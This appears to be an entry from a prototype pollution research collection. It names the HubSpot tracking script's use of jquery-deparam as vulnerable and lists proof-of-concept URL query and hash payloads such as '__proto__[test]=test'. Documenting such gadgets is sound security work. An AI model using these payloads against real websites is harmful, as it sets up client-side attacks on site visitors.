## HubSpot Tracking Code

URL: https://knowledge.hubspot.com/reports/install-the-hubspot-tracking-code

### Vulnerable code fragment

https://js.hs-analytics.net/analytics/12345/1234556789.js  

Uses [deparam](/pp/jquery-deparam.md)

### PoC
```html
<script type="text/javascript" id="hs-script-loader" async defer src="https://js.hs-scripts.com/1234.js"></script>
```
```
?__proto__[test]=test
?constructor[prototype][test]=test
#__proto__[test]=test
#constructor[prototype][test]=test
```